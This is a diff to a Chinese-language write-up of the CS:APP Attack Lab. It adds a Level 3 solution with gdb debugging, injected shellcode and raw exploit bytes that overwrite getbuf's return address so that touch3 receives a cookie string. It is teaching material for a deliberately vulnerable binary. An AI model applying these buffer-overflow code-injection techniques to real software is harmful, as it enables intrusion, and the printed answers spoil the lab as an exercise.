@@ -1,6 +1,6 @@
 ### 实验3 攻击实验
 ***
-## Level 1
+## LeveL 1
 通过阅读README.md文件，了解我们的任务，`test()`函数中调用了`getbuf()`函数，我们希望在执行完`getbuf()`函数后不要返回`test()`函数，而是返回到`touch1()`函数。
 
 `unix> objdump -d ctarget > ctarget.s`命令可以将`ctarget`文件反汇编成汇编代码。
@@ -83,7 +83,7 @@ PASS: Would have posted the following:
 ```
 可以看到我们成功调用了`touch1()`函数，完成了攻击实验的第一级。
 
-## Level2
+## LeveL 2
 
 阅读一下README文件，查看一下我们的目标，我们需要返回到`touch2()`函数，并且设置好cookie的值。我们查看`touch2()`函数的地址,修改我们的exploit.txt文件。
 `00000000004017ec`
@@ -173,6 +173,135 @@ PASS: Would have posted the following:
         result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
 [Inferior 1 (process 34464) exited normally]
 ```
+## Level 3
+
+任务跟前面的LeveL一样，需要回到`touch3()`函数，而不是返回到`test()`函数，同时还涉及`hexmatch()`函数，下面两个函数c语言代码如下:
+```c
+/* Compare string to hes represention of unsigned value */
+int hexmatch(unsigned val, char *sval)
+{
+        char cbuf[110];
+        /* Make position of check string unpredictable */
+        char *s = cbuf + random() % 100;
+        sprintf(s, "%.8x", val);
+        return strncmp(sval, s, 9) == 0;
+}
+
+void touch3(char *sval)
+{
+        vlevel = 3; /* Part of validation protocol */
+        if (hexmatch(cookie, sval))
+        {
+                printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        }
+        else {
+                printf("Misfire: You called touch3(\"%s\")\n", sval);
+                fail(3);
+        }
+        exit(0);
+}
+```
+通过研究`hexmatch() touch3() getbuf()`函数，首先`touch3()`函数的`char *sval`参数是**LeveL 2**中提到的`%rdi`寄存器的值(由infile定义)，而`hexmatch()`函数将`cookie`值放在cbuf数组的一个随机位置，并且将这个位置的地址赋值给`s`指针，然后将`s`指针指向的字符串与`sval`进行比较，也就是说，我们需要将cookie值在进入`touch3()`函数之前注入到输入字符串中，这样才能成功调用`touch3()`函数。
+
+先找到`touch3()`函数的地址
+`00000000004018fa`   
+我们将断点打在`hexmatch()`函数调用之前，看看输入参数的情况。
+```
+(gdb) p/x $rdi
+$2 = 0x59b997fa
+(gdb) p/x $rsi
+$3 = 0x7ffff7fb6980
+```
+猜测我们只需要像level2那样就行注入代码攻击即可成功，尝试一下。
+```
+0000000000000000 <_start>:
+   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
+   7:   68 fa 18 40 00          pushq  $0x4018fa
+   c:   c3                      retq
+```
+不出意外报错了,通过在`hexmatch()`函数入口打断点调试发现
+```
+hexmatch (val=1505335290, 
+    sval=sval@entry=0x59b997fa <error: Cannot access memory at address 0x59b997fa>) at visible.c:62
+62      in visible.c
+```
+发现`hexmatch()`函数的第二个参数`sval`的值是我们注入的cookie值，而不是一个字符串，所以我们需要将cookie值转换成字符串的形式注入到输入字符串中，这样才能成功调用`hexmatch()`函数.
+```assembly
+.text                   # 代码（指令）
+.globl _start           # 全局符号_start，链接器从这里开始执行
+_start:                 # 程序入口
+leaq str(%rip), %rdi    # 把字符串地址放 rdi
+pushq $0x4018fa         # 将touch3函数的地址压入栈中
+ret                     # 返回到touch3函数
+
+str:
+    .string "59b997fa"
+```
+```
+0000000000000000 <_start>:
+   0:   48 8d 3d 06 00 00 00    lea    0x6(%rip),%rdi        # d <str>
+   7:   68 fa 18 40 00          pushq  $0x4018fa
+   c:   c3                      retq   
+
+000000000000000d <str>:
+   d:   35 39 62 39 39          xor    $0x39396239,%eax
+  12:   37                      (bad)  
+  13:   66 61                   data16 (bad)
+```
+```
+48 8d 3d 06 00 00 00 68 fa 18 40 00 c3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
+```
+又报错了   
+```
+root@LAPTOP-0PTH5R3A:/home/emilia/emilia/csapplab/attacklab/target1# ./ctarget -q < exploit-raw.txt
+Cookie: 0x59b997fa
+Type string:Misfire: You called touch3("")
+FAIL: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:FAIL:0xffffffff:ctarget:3:48 8D 3D 06 00 00 00 68 FA 18 40 00 C3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
+```
+
+我们注入的字符串没有成功传递到`touch3()`函数中，经过调试发现：    
+- 我把注入代码入口覆盖成了 0x5561dc78（最后 8 字节）。
+- 代码里 leaq str(%rip), %rdi 得到的 str 大约是 0x5561dc85（代码后面紧跟字符串）。
+- 但执行 ret 跳到 touch3 之前，%rsp 已经回到调用者栈顶（约 0x5561dca8 一带）。
+- touch3 -> hexmatch -> sprintf/strncmp 会继续在栈上分配和写入，覆盖 %rsp 以下地址。
+- 我的字符串地址 0x5561dc85 在 %rsp 以下，所以很容易被踩坏，hexmatch 比较时就失败。
+
+所以只需要将字符串的位置放置在返回地址的上面就可以了，修改一下输入文件的值再次尝试。
+```
+0000000000000000 <_start>:
+           0:   48 89 e7                mov    %rsp,%rdi
+           3:   68 fa 18 40 00          pushq  $0x4018fa
+           8:   c3                      retq   
+        ...
+
+000000005561dca8 <my_str>:
+    5561dca8:   35 39 62 39 39          xor    $0x39396239,%eax
+    5561dcad:   37                      (bad)  
+    5561dcae:   66 61                   data16 (bad)
+```
+
+```
+48 89 e7 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
+```
+```
+Continuing.
+Type string:Touch3!: You called touch3("59b997fa")
+Valid solution for level 3 with target ctarget
+PASS: Would have posted the following:
+        user id bovik
+        course  15213-f15
+        lab     attacklab
+        result  1:PASS:0xffffffff:ctarget:3:48 89 E7 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
+[Inferior 1 (process 32849) exited normally]
+```
+可以发现我们成功调用了`touch3()`函数，并且成功通过了`hexmatch()`函数的验证，完成了攻击实验的第三级。
+
+
+
 
 
 
